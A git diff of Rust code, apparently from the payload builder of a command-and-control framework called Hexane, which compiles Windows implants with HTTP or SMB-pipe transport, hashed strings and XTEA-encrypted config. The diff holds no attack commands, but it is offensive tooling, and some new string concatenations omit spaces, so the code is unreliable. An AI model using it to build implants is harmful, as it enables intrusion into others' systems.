@@ -1,4 +1,4 @@
-use std::{env, fs};
+use std::fs;
 use rand::Rng;
 use std::str::FromStr;
 use std::borrow::Borrow;
@@ -8,12 +8,11 @@ use std::sync::{Arc, Mutex};
 use std::sync::mpsc::channel;
 
 use rayon::prelude::*;
-use rayon::iter::IntoParallelRefIterator;
 
 use crate::server::INSTANCES;
 use crate::server::session::{CURDIR, SESSION};
 use crate::server::types::{NetworkType, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData, BuildType};
-use crate::server::utils::{generate_hashes, run_command, wrap_message};
+use crate::server::utils::{create_directory, generate_hashes, run_command, wrap_message};
 use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::binary::embed_section_data;
 use crate::server::error::{Error, Result};
@@ -117,9 +116,10 @@ impl Hexane {
     fn setup_instance(&mut self) -> Result<()> {
         let mut rng = rand::thread_rng();
 
-        let strings_file    = "./config/strings.txt";
-        let hash_file       = "./core/src/include/names.hpp";
+        let strings_file    = "./configs/strings.txt";
+        let hash_file       = "./core/include/names.hpp";
 
+        self.compiler.build_directory = format!("./payload/{}", self.builder.output_name);
         self.peer_id    = rng.random::<u32>();
         self.group_id   = 0;
 
@@ -130,18 +130,20 @@ impl Hexane {
             self.compiler.compiler_flags = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC  -fno-builtin -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections".to_owned();
         }
 
+
         wrap_message("debug", &"creating build directory".to_owned());
-        fs::create_dir(&self.compiler.build_directory)?;
+        create_directory(&self.compiler.build_directory)?;
 
         wrap_message("debug", &"generating config data".to_owned());
         &self.generate_config_bytes()?;
 
         wrap_message("debug", &"generating string hashes".to_owned());
         generate_hashes(strings_file, hash_file)?;
+
+        wrap_message("debug", &"generating defintions".to_owned());
         generate_definitions(&self.compiler.definitions);
 
         wrap_message("debug", &"building sources".to_owned());
-
         self.compile_sources()?;
         self.run_server()?;
 
@@ -250,21 +252,16 @@ impl Hexane {
 
         if self.compiler.command != "ld" && self.compiler.command != "nasm" {
             if self.main.debug {
-                wrap_message("debug", &"debug build type selected".to_owned());
                 defs.insert("DEBUG".to_string(), vec![]);
             }
 
             let arch = &self.main.architecture;
-            wrap_message("debug", &format!("{arch} build type selected"));
-
             match arch {
                 AMD64   => { defs.insert("BSWAP".to_string(), vec![0]); },
                 _       => { defs.insert("BSWAP".to_string(), vec![1]); },
             }
 
             if let Some(network) = &self.network {
-                wrap_message("debug", &format!("{:?} network type selected", &network.r#type));
-
                 match network.r#type {
                     NetworkType::Http   => { defs.insert("TRANSPORT_HTTP".to_string(), vec![]); },
                     NetworkType::Smb    => { defs.insert("TRANSPORT_PIPE".to_string(), vec![]); },
@@ -273,12 +270,10 @@ impl Hexane {
         }
 
         if !self.compiler.components.is_empty() {
-            wrap_message("debug", &"generating arguments".to_owned());
             self.compiler.command += &generate_arguments(self.compiler.components.clone());
         }
 
         for (k, v) in &defs {
-            wrap_message("debug", &"generating definitions".to_owned());
             self.compiler.command += &generate_definitions(&HashMap::from([(k.clone(), v.clone())]));
         }
 
@@ -295,42 +290,49 @@ impl Hexane {
     }
 
     pub fn compile_sources(&mut self) -> Result<()> {
-        let src_path            = Path::new(&self.builder.root_directory).join("src");
-        let mut entries: Vec<_> = fs::read_dir(src_path)?.filter_map(|entry| entry.ok()).collect();
-        let mut components      = Vec::new();
+        let src_path        = Path::new(&self.builder.root_directory).join("src");
+        let mut components  = self.compiler.components.clone();
 
+        let mut entries: Vec<_>     = fs::read_dir(src_path)?.filter_map(|entry| entry.ok()).collect();
         let (err_send, err_recv)    = channel();
         let atoms                   = Arc::new(Mutex::new(()));
 
-        entries.par_iter_mut().for_each(|src| {
+        entries.iter_mut().for_each(|src| {
             if !src.metadata().map_or(false, |map| map.is_file()) {
                 return;
             }
 
-            let path        = src.path();
-            let output      = self.builder.output_name.clone();
-            let mut flags   = self.compiler.compiler_flags.clone();
-            let mut command = self.compiler.command.clone();
+            let path            = src.path();
+            let output          = self.builder.output_name.clone();
+            let mut flags       = self.compiler.compiler_flags.clone();
+            let mut command     = self.compiler.command.clone();
 
             let atoms_clone = Arc::clone(&atoms);
             let err_clone   = err_send.clone();
             let _guard      = atoms_clone.lock().unwrap();
 
+            let source = match src.file_name().to_str() {
+                Some(name)  => src_path.join(name),
+                None        => { eprintln!("Error: Invalid file name"); return; }
+            };
+
             match path.extension().and_then(|ext| ext.to_str()) {
                 Some("asm") => {
 
-                    command.push("nasm".parse().unwrap());
-                    flags = "-f win64".parse().unwrap(); // remove all flags if nasm and add -f arch
+                    command.push_str("nasm");
+                    flags = "-f win64".to_string(); // remove all flags if nasm and add -f arch
+                    flags.push_str(source.to_str().unwrap());
 
-                    wrap_message("debug", &format!("compiling {}", &output));
+                    wrap_message("debug", &format!("compiling {:?}", &src.file_name().to_str()));
                 }
 
                 Some("cpp") => {
 
-                    command.push("x86_64-w64-mingw32-g++".parse().unwrap());
-                    flags.push("-c".parse().unwrap());
+                    command.push_str("x86_64-w64-mingw32-g++");
+                    flags.push_str("-c");
+                    flags.push_str(source.to_str().unwrap());
 
-                    wrap_message("debug", &format!("compiling {}", &output));
+                    wrap_message("debug", &format!("compiling {:?}", &src.file_name().to_str()));
 
                 }
                 _ => {}
@@ -341,7 +343,7 @@ impl Hexane {
                 err_clone.send(e).unwrap();
             }
             else {
-                components.push(output.parse::<Vec<String>>().unwrap().to_string());
+                components.push(output);
             }
         });
 
@@ -357,19 +359,15 @@ impl Hexane {
 }
 
 pub fn generate_includes(includes: Vec<String>) -> String {
-    wrap_message("debug", &"including directories".to_owned());
     includes.iter().map(|inc| format!(" -I{} ", inc)).collect::<Vec<_>>().join("")
 }
 
 pub fn generate_arguments(args: Vec<String>) -> String {
-    wrap_message("debug", &"generating arguments".to_owned());
     args.iter().map(|arg| format!(" {} ", arg)).collect::<Vec<_>>().join("")
 }
 
 pub fn generate_definitions(definitions: &HashMap<String, Vec<u8>>) -> String {
     let mut defs    = String::new();
-
-    wrap_message("debug", &"generating defintions".to_owned());
 
     for (name, def) in definitions {
         if def.is_empty() {
